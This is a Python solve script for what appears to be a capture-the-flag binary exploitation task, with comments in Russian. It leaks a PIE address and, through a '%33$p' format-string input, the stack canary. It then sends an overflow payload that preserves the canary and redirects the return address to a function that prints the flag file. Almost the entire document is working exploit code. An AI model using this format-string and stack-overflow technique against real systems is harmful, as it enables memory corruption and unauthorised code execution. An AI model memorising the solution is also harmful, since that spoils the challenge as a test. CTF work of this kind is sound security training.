#!/usr/bin/env python3
"""Эксплойт для «Дела о долине ужаса»: PIE + canary + format string.

Идея решения:
  1. Сервис печатает адрес recording — считаем базу загрузки (PIE).
  2. Первый ввод идёт в printf как строка формата: %33$p утечёт stack canary.
  3. Второй ввод — read(240) в transcript[72]: переполняем, сохраняем canary
     и подменяем адрес возврата на genuine_ending (база + 0x11b9).
  4. Оба ввода — одно соединение (один процесс): canary и база PIE между
     ними не меняются, а read(240) берёт пейлоад одним куском (240 < MSS).
  5. genuine_ending открывает /run/case/flag и печатает флаг.

Запуск:  python3 solve.py [host] [port]   (по умолчанию 127.0.0.1 13426)
"""

import re
import socket
import struct
import sys

# оффсеты символов из хэндаута (valley — тот же ELF, что в сервисе):
# адрес функции минус такой оффсет = база загрузки PIE
RECORDING_OFFSET = 0x1257
GENUINE_ENDING_OFFSET = 0x11B9
# смещение canary от начала transcript: 72 (сам буфер) + 128 (observation)
# + выравнивание локалов — сверяется по хэндауту в gdb
CANARY_OFFSET = 216

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 13426

with socket.create_connection((host, port), timeout=15) as sock:
    # сервис сам подсказывает PIE-маркер «recording marker: %p» — адрес
    # функции recording, из него выводится база загрузки
    intro = sock.recv(4096)
    recording = int(re.search(rb"0x[0-9a-f]+", intro).group(), 16)
    # первый ввод уходит в printf как строка формата: canary лежит в 33-м
    # vararg-слоте стека (оффсет стабилен для этого бинарника)
    sock.sendall(b"%33$p\n")
    diagnostic = sock.recv(4096)
    canary = int(re.search(rb"0x[0-9a-f]+", diagnostic).group(), 16)
    base = recording - RECORDING_OFFSET
    # раскладка переполнения: паддинг до canary → сохранённый canary (иначе
    # __stack_chk_fail) → 8 байт сохранённого rbp (не важен) → поверх
    # адреса возврата — genuine_ending
    payload = (
        b"A" * CANARY_OFFSET
        + struct.pack("<Q", canary)
        + b"B" * 8
        + struct.pack("<Q", base + GENUINE_ENDING_OFFSET)
    )
    # одним send'ом: read(240) забирает сколько пришло за раз, дробный
    # пейлоад остался бы недописанным
    sock.sendall(payload)
    sock.shutdown(socket.SHUT_WR)
    print(b"".join(iter(lambda: sock.recv(4096), b"")).decode(), end="")
